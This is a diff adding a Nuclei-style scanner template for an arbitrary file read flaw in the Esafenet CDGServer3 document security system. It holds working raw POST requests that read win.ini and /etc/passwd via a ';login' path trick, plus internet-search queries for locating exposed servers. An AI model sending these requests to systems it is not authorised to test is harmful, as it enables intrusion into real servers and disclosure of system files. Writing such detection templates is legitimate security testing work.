@@ -1,0 +1,54 @@
+id: esafenet-cdgserver3-uploadfilemanager-fileread
+
+info:
+  name: 亿赛通电子文档安全管理系统 UploadFileManagerService - 任意文件读取漏洞
+  author: leadlife
+  severity: high
+  description: 亿赛通电子文档安全管理系统的 UploadFileManagerService 接口存在任意文件读取漏洞，允许攻击者读取任意文件。
+  reference:
+    - todo
+  metadata:
+    verified: true
+    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+    hunter-query: app.name="ESAFENET 亿赛通文档安全管理系统"
+  tags: fileread,esafenet
+
+http:
+  - raw:
+      - |-
+        POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept-Language: zh-CN
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello
+
+      - |-
+        POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept-Language: zh-CN
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        command=ViewUploadFile&filePath=/etc/passwd&fileName1=hello
+
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+          - "\\[(font|extension|file)s\\]"
+        condition: or
+
+      - type: status
+        status:
+          - 200
